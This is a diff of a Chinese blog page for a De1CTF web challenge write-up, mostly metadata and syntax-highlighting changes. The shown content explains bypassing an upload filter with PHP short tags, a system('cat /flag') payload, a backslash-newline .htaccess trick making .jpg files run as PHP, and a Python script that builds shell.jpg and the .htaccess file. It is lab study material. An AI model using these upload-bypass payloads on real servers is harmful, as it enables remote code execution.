@@ -58,7 +58,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;09&#x2F;De1CTF-%E5%A4%8D%E7%8E%B0-web&#x2F;1.jpg">
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;09&#x2F;De1CTF-%E5%A4%8D%E7%8E%B0-web&#x2F;2.jpg">
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;09&#x2F;De1CTF-%E5%A4%8D%E7%8E%B0-web&#x2F;3.jpg">
-<meta property="og:updated_time" content="2020-05-10T05:49:55.713Z">
+<meta property="og:updated_time" content="2020-05-18T05:52:29.611Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;09&#x2F;De1CTF-%E5%A4%8D%E7%8E%B0-web&#x2F;1.jpg">
 
@@ -251,7 +251,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-10 13:49:55" itemprop="dateModified" datetime="2020-05-10T13:49:55+08:00">2020-05-10</time>
+                <time title="修改时间：2020-05-18 13:52:29" itemprop="dateModified" datetime="2020-05-18T13:52:29+08:00">2020-05-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -285,7 +285,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">893(字)</span>
+           <span class="post-count">904(字)</span>
            
          </span>
 	  
@@ -295,7 +295,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">阅读时长:</span>
-           <span class="post-count">3(分)</span>
+           <span class="post-count">4(分)</span>
            
         </span>
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -342,7 +342,7 @@ PHP短标签
 <li>然后还要MIME是image类型才行</li>
 </ul>
 <p>ph的限制的话用短标签来绕过。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">短标签记得在php.ini里面把short_open_tag=<span class="keyword">on</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">我记得是默认开启的</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">简单描述：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?</span>= <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    等价于</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?</span>php echo <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    所以可以构造<span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">'cat /flag'</span>) 来得到flag</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    然后利用.htaccess文件把jpg文件解析成php文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    .htaccess里面的php利用`\`加换行符绕过。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    我的理解：斜杠应该是转义(以前没遇到过，如果我说错了希望能纠正我一下，下次就不会错了。。)</span></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">短标签记得在php.ini里面把short_open_tag=on</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">我记得是默认开启的</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">简单描述：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="php"><span class="meta">&lt;?</span>= <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    等价于</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"hello!"</span> <span class="meta">?&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    所以可以构造<span class="php"><span class="meta">&lt;?</span>=system(<span class="string">'cat /flag'</span>) 来得到flag</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="php">    然后利用.htaccess文件把jpg文件解析成php文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="php">    .htaccess里面的php利用`\`加换行符绕过。(<span class="string">'\'：连接当前行与下一行字符)</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="php">    我的理解：斜杠应该是转义(以前没遇到过，如果我说错了希望能纠正我一下，下次就不会错了。。)</span></span></pre></td></tr></table></figure>
 <p>生成两个文件的快捷脚本= =</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = b<span class="string">"\n\n#define width 1337\n#define height 1337\n\n"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">def generate_php_file(filename, script):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">'wb'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">write</span>(script.encode(<span class="string">'utf-16be'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">write</span>(SIZE_HEADER)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    phpfile.<span class="built_in">close</span>()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">def generate_htacess():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">write</span>(SIZE_HEADER)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'AddType application/x-httpd-php .jpg\n'</span>)   <span class="comment">##反斜杠和换行自己手动加吧。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    htaccess.<span class="built_in">close</span>()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">generate_htacess()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">generate_php_file(<span class="string">"shell.jpg"</span>, <span class="string">"&lt;?=system('cat /flag');"</span>)</span></pre></td></tr></table></figure>
 <h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p id="div-border-left-red">考点：
@@ -387,7 +387,7 @@ spel注入(以前用过这个类，或者他已经被包含进去了。看了好
       <i class="fa fa-chevron-left"></i> XSS绕过HTTPonly
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-web/" rel="next" title="网鼎杯2020青龙组-web">
+    <a href="/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/" rel="next" title="网鼎杯2020青龙组-web">
       网鼎杯2020青龙组-web <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -444,14 +444,14 @@ spel注入(以前用过这个类，或者他已经被包含进去了。看了好
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-count">63</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
